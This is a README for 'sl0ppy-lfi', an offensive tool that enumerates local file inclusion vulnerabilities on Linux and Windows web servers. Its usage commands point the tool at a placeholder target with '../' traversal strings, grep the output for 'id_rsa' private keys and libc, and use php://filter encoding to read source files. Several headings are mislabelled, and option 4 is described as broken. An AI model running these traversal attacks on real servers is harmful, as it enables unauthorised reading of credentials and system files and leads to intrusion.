# sl0ppy-lfi
A small lfi enum tool, i upgraded the original source a bits here and there.  

# Added searches
* linux local files 
* linux log files 
* Linux proc files
* linux apache files
* linux .ssh files
* linux other files 

* windows local files
* windows log files
* windows config files
* windows other stuff    
* and alot more 

# !Added php://filther encoding! 

# install
* make all files executable with this command
* chmod +x install && ./install

# Usage 
* sl0ppy-lfi  
* sl0ppy-lfi-fw 


## {!} change the static set user and hash out the read -p "Please Enter Systems Username: " on all 4 blocks {!}
* Or use the pre-default implemented(read -p), and submit system user when asked for it.

# Usage sl0ppy-lfi  (old-original-file soon to be fully replaced by sl0ppy-lfi-fw) 

# Enum all sl0ppy-lfi
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=` 
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../` 


# Enum specific stuff like only libc
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= | grep "libc"`
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= | grep "id_rsa"` 
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../ | grep "libc"` 
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page=../../../../../../../../../../ | grep "id_rsa"`

# Output Enum 
* `./sl0ppy-lfi http://server.vulnerable.com/index.php?page= > output && cat output`  

# Usage sl0ppy-ProcessInfo
`./sl0ppy-ProcessInfo http://server.vulnerable.com/download.php?file=` 

# Usage sl0ppy-filter-enc-lfi
`./sl0ppy-filter-enc-lfi http://server.vulnerable.com/index.php > sl0ppy-enc.txt || cat /home/x0/sl0ppy-lfi/sl0ppy-enc.txt`

# Usage sl0ppy-lfi-fw (sl0ppy-lfi-framework)

# Usage 
* `./sl0ppy-lfi-fw` 
* Choice 1 for windows based lfi file checks
* Choise 2 for linux based lfi file checks
* Cboise 3 for linux & windows lfi file checks
* choise 4 for PHP://filther encoding.. (Temp not working in framework, looking to fix it on short notice)
* Enter the lfi url when it ask for it like this.. http://server.vulnerable.com/index.php?page=` 
* Else as http://server.vulnerable.com/index.php?page=../../../../../../../../../../
* Or any other lfi param or pages... 

# Examples sl0ppy-lfi-fw

# usage Windows-lfi 
* `./sl0ppy-lfi-fw`
* option 1
* enter url when it ask for it like this http://server.vulnerable.com/index.php?page=
* or any other page, or lfi param

# usage Windows-lfi 
* `./sl0ppy-lfi-fw`
* option 2
* enter url when it ask for it like this http://server.vulnerable.com/index.php?page=
* or any other page, or lfi param

# usage Windows-lfi 
* `./sl0ppy-lfi-fw`
* option 3
* enter url when it ask for it like this http://server.vulnerable.com/index.php?page=
* or any other page, or lfi param

# !(sum issues in fw option 4 not working atm, working on fixing it...)
# Usage php://Filther-encoding` 
* `./sl0ppy-lfi-fw`
* * option 4 
* enter url when it ask for it like this http://server.vulnerable.com/index.php
